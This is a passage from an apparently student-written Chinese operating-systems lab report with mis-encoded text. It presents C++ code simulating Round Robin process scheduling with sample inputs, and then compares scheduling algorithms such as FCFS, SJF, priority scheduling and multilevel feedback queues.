class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXname 100</span><br><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//å½“å‰æ—¶é—´</span><br><span class="hljs-keyword">int</span> q = <span class="hljs-number">0</span>;            <span class="hljs-comment">//è®¾å®šçš„æ—¶é—´ç‰‡å¤§å°</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //è¿›ç¨‹ç»“æ„ä½“ï¼Œè¡¨ç¤ºè¿›ç¨‹ä¿¡æ¯</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//è¿›ç¨‹åå­—</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//åˆ°è¾¾æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//è¿›ç¨‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//è¿›ç¨‹ç­‰å¾…æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//å‘¨è½¬æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//è¿›ç¨‹ç»“æŸæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> time_slice;      <span class="hljs-comment">//è¿›ç¨‹æ—¶é—´ç‰‡</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue;<span class="hljs-comment">//ä¾æ¬¡ä¸ºå°±ç»ªé˜Ÿåˆ—ã€é˜»å¡é˜Ÿåˆ—</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(Process &amp;a, Process &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.arrive_time &lt; b.arrive_time;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¿›ç¨‹åˆå§‹åŒ–</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¿›ç¨‹æ•°é‡&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥æ—¶é—´ç‰‡é•¿åº¦&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥ç¬¬&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;ä¸ªè¿›ç¨‹çš„åå­—  åˆ°è¾¾æ—¶é—´  æœåŠ¡æ—¶é—´&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>        p[i].time_slice = q; <span class="hljs-comment">//è®¾ç½®è¿›ç¨‹æ—¶é—´ç‰‡</span><br>        p[i].end_time = <span class="hljs-number">0</span>;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//å½“å‰æ— è¿›ç¨‹è¿è¡Œ</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//å°†è¿›ç¨‹åŠ å…¥é˜»å¡é˜Ÿåˆ—ï¼ˆæœªè¾¾åˆ°åˆ™è§†ä¸ºé˜»å¡ï¼‰</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//å½“å°±ç»ªé˜Ÿåˆ—éç©ºæ—¶</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//å–ä¸‹ä¸ªè¿›ç¨‹</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//å¦åˆ™å°†è¿è¡Œè¿›ç¨‹ç½®ä¸ºç©º</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//è®¡ç®—ç­‰å¾…æ—¶é—´</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//é˜»å¡å‡½æ•°ï¼Œéšæœºæ¦‚ç‡é˜»å¡</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¿›ç¨‹è°ƒåº¦å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//éšæœºæ•°ç§å­</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;----------------------------------------RRè°ƒåº¦ç®—æ³•----------------------------------------&quot;</span> <br>         &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å½“å‰æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å½“å‰è¿›ç¨‹  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹åˆ°è¾¾æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹ç­‰å¾…æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹æœåŠ¡æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å‰©ä½™è¿è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å‰©ä½™æ—¶é—´ç‰‡æ—¶é—´&quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//å½“ä¸‰ä¸ªé˜Ÿåˆ—å‡ä¸ºç©ºæ—¶ï¼Œè¯´æ˜è¿›ç¨‹å…¨éƒ¨è¿è¡Œå®Œ</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//ç»“æŸ</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//é˜»å¡é˜Ÿåˆ—éç©ºä¸”é˜Ÿé¦–å…ƒç´ åˆ°è¾¾æ—¶é—´å·²åˆ°å½“å‰æ—¶é—´</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//å°†è¿›å…¥å°±ç»ªé˜Ÿåˆ—çš„æ—¶é—´ä½œä¸ºè¿›ç¨‹åˆ°è¾¾æ—¶é—´ï¼ˆé’ˆå¯¹äºé˜»å¡è¿‡çš„è¿›ç¨‹ï¼‰</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//åˆ™åŠ å…¥å°±ç»ªé˜Ÿåˆ—</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//ä»é˜»å¡é˜Ÿåˆ—åˆ é™¤</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//å°±ç»ªé˜Ÿåˆ—éç©ºå’Œè¿è¡Œè¿›ç¨‹éç©º</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//åˆ™ä»å°±ç»ªå¯¹åˆ—å–é¦–å…ƒç´ </span><br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//ä»å°±ç»ªé˜Ÿåˆ—åˆ é™¤</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//è‹¥å½“å‰æ— è¿è¡Œè¿›ç¨‹ï¼Œåˆ™è¾“å‡ºç©º</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//å½“å‰æœ‰è¿è¡Œè¿›ç¨‹åˆ™è¾“å‡ºä¿¡æ¯</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.time_slice<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//å½“å‰æ—¶é—´åŠ 1</span><br>            run_process.remain_time--; <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´å‡1</span><br>            run_process.time_slice--;  <span class="hljs-comment">//è¿›ç¨‹æ—¶é—´ç‰‡æ—¶é—´å‡1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´ä¸º0</span><br>            &#123;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (run_process.time_slice == <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“è¿›ç¨‹æ—¶é—´ç‰‡ä¸º0æ—¶</span><br>            &#123;<br>                run_process.time_slice = q;             <span class="hljs-comment">//æ¢å¤æ—¶é—´ç‰‡</span><br>                run_process.arrive_time = current_time; <span class="hljs-comment">//æ›´æ–°åˆ°è¾¾æ—¶é—´</span><br>                ready_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//å†æ¬¡å…¥é˜Ÿ</span><br><br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//å½“è¿›ç¨‹æœ‰è¿è¡Œæ—¶é—´å’Œæ—¶é—´ç‰‡æ—¶ï¼Œå¯èƒ½å‘ç”Ÿé˜»å¡</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------è¿›ç¨‹é˜»å¡ï¼Œåˆ‡æ¢è¿›ç¨‹----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//è‹¥å‘ç”Ÿé˜»å¡ï¼Œä¿®æ”¹å½“å‰è¿›ç¨‹åˆ°è¾¾æ—¶é—´</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//å¹¶åŠ å…¥é˜»å¡é˜Ÿåˆ—ä¸­</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¾“å‡ºè¿›ç¨‹ä¿¡æ¯</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹åå­—  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;æœåŠ¡æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;ç­‰å¾…æ—¶é—´  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å¹³å‡ç­‰å¾…æ—¶é—´ä¸ºï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">process_init</span>();<br>    <span class="hljs-built_in">process_schedule</span>();<br>    <span class="hljs-built_in">print_process_information</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p><strong>ä¸è€ƒè™‘é˜»å¡ï¼š</strong></p><p>åˆå€¼ï¼ˆå°æ—¶é—´ç‰‡ï¼‰ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/posts/3f961b4f/image-20211112213852527.png" alt="image-20211112213852527"></p><p><strong>è€ƒè™‘é˜»å¡ï¼š</strong></p><p>åˆå€¼ï¼ˆå°æ—¶é—´ç‰‡ï¼‰ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/posts/3f961b4f/image-20211112213737120.png" alt="image-20211112213737120"></p><p><strong>æ—¶é—´ç‰‡å¾ˆå¤§ï¼ˆç­‰åŒäºFCFSï¼‰</strong></p><p>åˆå€¼ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">60</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/posts/3f961b4f/image-20211112213941550.png" alt="image-20211112213941550"></p><h3 id="æ€è€ƒé¢˜"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜"></a> æ€è€ƒé¢˜</h3><blockquote><p>æ ¹æ®ä¸Šé¢çš„è§‚å¯Ÿç»“æœï¼Œæ¯”è¾ƒè¿™ä¸¤ç§ç®—æ³•å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œæ ¹æ®ç»“æœå†å’Œå…¶ä»–çš„ç®—æ³•æ¯”è¾ƒã€‚</p></blockquote><p><strong>FCFS è°ƒåº¦</strong>çš„ä»£ç ç¼–å†™ç®€å•ä¸”å®¹æ˜“ç†è§£ã€‚ä½†æ˜¯ï¼Œ é‡‡ç”¨FCFS ç­–ç•¥çš„å¹³å‡ç­‰å¾…æ—¶é—´é€šå¸¸è¾ƒé•¿ã€‚</p><p>RRç®—æ³•çš„æ€§èƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºæ—¶é—´ç‰‡çš„å¤§å°ã€‚åœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¦‚æœæ—¶é—´ç‰‡éå¸¸å¤§ï¼Œé‚£ä¹ˆRRç®—æ³•ä¸FCFSç®—æ³•ä¸€æ ·ï¼Œå¦‚æœæ—¶é—´ç‰‡å¾ˆå°(å¦‚1ms)ï¼Œé‚£ä¹ˆRç®—æ³•ç§°ä¸ºå¤„ç†å™¨å…±äº«ã€‚</p><p>è€Œ<strong>SJF è°ƒåº¦ç®—æ³•</strong>å¯è¯æ˜ä¸ºæœ€ä½³çš„ï¼Œ è¿™æ˜¯å› ä¸ºå¯¹äºç»™å®šçš„ä¸€ç»„è¿›ç¨‹ï¼Œ SJF ç®—æ³•çš„å¹³å‡ç­‰å¾…æ—¶é—´æœ€å°ã€‚</p><p><strong>ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•</strong>å¯ä»¥è‡ªè¡Œé€‰æ‹©è¿›ç¨‹ä¼˜å…ˆçº§æ¥è°ƒåº¦ï¼Œä½†æ˜¯å…¶ä¸€ä¸ªä¸»è¦é—®é¢˜æ˜¯<strong>æ— ç©·é˜»å¡</strong>ï¼ˆindefinite blockingï¼‰æˆ–é¥¥é¥¿ï¼ˆ starvationï¼‰ã€‚å¯ä»¥è¿è¡Œä½†ç¼ºä¹CPU çš„è¿›ç¨‹å¯è®¤ä¸ºæ˜¯é˜»å¡çš„ï¼Œå®ƒåœ¨ç­‰å¾…CPUã€‚ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ä¼šä½¿æŸä¸ªä½ä¼˜å…ˆçº§è¿›ç¨‹æ— ç©·ç­‰å¾…CPUã€‚</p><p><strong>å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•</strong>å…è®¸è¿›ç¨‹åœ¨é˜Ÿåˆ—ä¹‹é—´ç§»åŠ¨ã€‚ä¸»è¦æ€æƒ³æ˜¯æ ¹æ®ä¸åŒCPUåŒºé—´çš„ç‰¹ç‚¹ä»¥åŒºåˆ†è¿›ç¨‹ã€‚å¦‚æœè¿›ç¨‹ä½¿ç”¨è¿‡å¤šCPUæ—¶é—´ï¼Œ é‚£ä¹ˆå®ƒä¼šè¢«è½¬ç§»åˆ°æ›´ä½ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚è¿™ç§æ–¹æ¡ˆå°†I/Oçº¦æŸå’Œäº¤äº’è¿›ç¨‹ç•™åœ¨æ›´é«˜ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚æ­¤å¤–ï¼Œ åœ¨è¾ƒä½ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ç­‰å¾…æ—¶é—´è¿‡é•¿çš„è¿›ç¨‹ä¼šè¢«è½¬ç§»åˆ°æ›´é«˜ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚è¿™ç§å½¢å¼çš„è€åŒ–é˜»æ­¢é¥¥é¥¿çš„å‘ç”Ÿã€‚</p><h2 id="äº”-å®éªŒæ€»ç»“"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“"></a> äº”ã€å®éªŒæ€»ç»“</h2><p>è¿™æ¬¡å®éªŒä¸»è¦å®ç°äº†FCFSè¿›ç¨‹è°ƒåº¦ç®—æ³•å’ŒRRè¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼Œæœ¬å®éªŒè®¾è®¡äº†ä¸¤ç‰ˆä»£ç ï¼Œæœ€å¼€å§‹è®¾è®¡FCFSæ—¶ï¼Œæƒ³çš„è¾ƒä¸ºç®€å•ï¼Œå°†å…¨éƒ¨è¿›ç¨‹éƒ½æ’åºåŠ å…¥äº†é˜Ÿåˆ—ï¼Œç„¶åä¾æ¬¡å‡ºé˜Ÿåˆ—å³å®Œæˆäº†è°ƒåº¦ï¼Œè¿™æ€è·¯å¯¼è‡´äº†æˆ‘ä¹‹åè®¾è®¡RRç®—æ³•æ—¶ä¹Ÿé‡‡ç”¨äº†è¿™ç§ç­–ç•¥ï¼Œä½†è¿™æ ·ä½¿å¾—ä¸€æ—¦æœ‰ä¸€ä¸ªè¿›ç¨‹è¢«ä¸­æ–­åè¦åŠ å…¥åŒ…å«å…¨éƒ¨è¿›ç¨‹çš„é˜Ÿåˆ—ï¼Œéœ€è¦å’Œé˜Ÿåˆ—é‡Œçš„æ‰€æœ‰è¿›ç¨‹æ¯”è¾ƒåˆ°è¾¾æ—¶é—´ï¼Œè€Œæˆ‘æœ€å¼€å§‹é‡‡å–çš„è§£å†³æ–¹æ³•æ˜¯å…¨éƒ¨å‡ºé˜Ÿï¼Œæ’åºåå†æ¬¡å…¥é˜Ÿï¼Œè™½ç„¶è¿™æ ·æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å´ä¸ç¬¦åˆæ¨¡æ‹Ÿçš„åˆè¡·ã€‚</p><p>åæ¥åœ¨ä»”ç»†çœ‹æµç¨‹å›¾åï¼Œå‘ç°è‡ªå·±ç¬¬ä¸€ç‰ˆçš„ä»£ç é‡Œæ²¡æœ‰è®¾è®¡é˜»å¡è¿›ç¨‹çš„å‡½æ•°ï¼Œè€Œä¸”åŸæ¥çš„è®¾è®¡å¾ˆéš¾åŠ è¿›å»è¿™ä¸ªåŠŸèƒ½ï¼Œæ‰€ä»¥å¹²è„†é‡æ–°å†™äº†ä¸€ç‰ˆRRè°ƒåº¦ç®—æ³•çš„ä»£ç ã€‚æŒ‰ç…§å®é™…è°ƒåº¦æ—¶çš„æƒ…å†µï¼Œæˆ‘å»ºç«‹äº†å°±ç»ªé˜Ÿåˆ—ã€é˜»å¡é˜Ÿåˆ—ã€å½“å‰è¿è¡Œè¿›ç¨‹ä¸‰ä¸ªé˜Ÿåˆ—ï¼Œé¦–å…ˆå°†å…¨éƒ¨è¿›ç¨‹åŠ å…¥é˜»å¡é˜Ÿåˆ—ï¼ˆæœªåˆ°åˆ°è¾¾æ—¶é—´çš„è¿›ç¨‹é»˜è®¤ä¸ºé˜»å¡ï¼‰,ç„¶åæ ¹æ®æ—¶é—´åŠ å…¥å°±ç»ªé˜Ÿåˆ—ï¼Œå½“å‰è¿›ç¨‹ä¸ºç©ºæ—¶ï¼Œä»å°±ç»ªé˜Ÿåˆ—å–å…ƒç´ ã€‚åŒæ—¶è®¾è®¡äº†ä¸€ä¸ªéšæœºé˜»å¡å‡½æ•° 